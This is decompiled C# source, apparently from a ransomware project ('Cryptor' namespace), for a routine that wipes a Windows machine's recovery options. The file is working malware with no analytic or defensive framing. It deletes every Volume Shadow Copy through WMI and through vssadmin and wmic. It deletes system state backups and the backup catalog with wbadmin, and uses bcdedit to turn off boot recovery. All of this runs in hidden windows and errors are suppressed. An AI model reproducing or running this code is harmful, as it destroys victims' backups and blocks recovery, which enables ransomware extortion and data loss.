using System;
using System.Diagnostics;
using System.Management;

namespace Cryptor;

internal class Shadow
{
	public static void DelCopy()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		try
		{
			ManagementScope val = new ManagementScope("\\\\.\\root\\cimv2");
			SelectQuery val2 = new SelectQuery("SELECT * FROM Win32_ShadowCopy");
			ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, (ObjectQuery)(object)val2);
			try
			{
				ManagementObjectCollection val4 = val3.Get();
				if (val4.Count > 0)
				{
					ManagementObjectEnumerator enumerator = val4.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val5 = (ManagementObject)enumerator.Current;
							try
							{
								ManagementBaseObject methodParameters = val5.GetMethodParameters("Delete");
								val5.InvokeMethod("Delete", methodParameters, (InvokeMethodOptions)null);
							}
							catch
							{
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		catch
		{
		}
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "vssadmin.exe";
			process.StartInfo.Arguments = "delete shadows /all /quiet";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
		try
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "wbadmin.exe";
			process2.StartInfo.Arguments = "DELETE SYSTEMSTATEBACKUP";
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
		}
		catch
		{
		}
		try
		{
			Process process3 = new Process();
			process3.StartInfo.FileName = "wbadmin.exe";
			process3.StartInfo.Arguments = "DELETE SYSTEMSTATEBACKUP -deleteOldest";
			process3.StartInfo.UseShellExecute = false;
			process3.StartInfo.CreateNoWindow = true;
			process3.Start();
		}
		catch
		{
		}
		ExecuteCommand("cmd.exe", "/c vssadmin delete shadows /all /quiet");
		ExecuteCommand("cmd.exe", "/c wmic shadowcopy delete");
		ExecuteCommand("cmd.exe", "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		ExecuteCommand("cmd.exe", "/c bcdedit /set {default} recoveryenabled no");
		ExecuteCommand("cmd.exe", "/c wbadmin delete catalog -quiet");
	}

	private static void ExecuteCommand(string command, string arguments)
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = command,
				Arguments = arguments,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			process.Start();
		}
		catch
		{
		}
	}
}
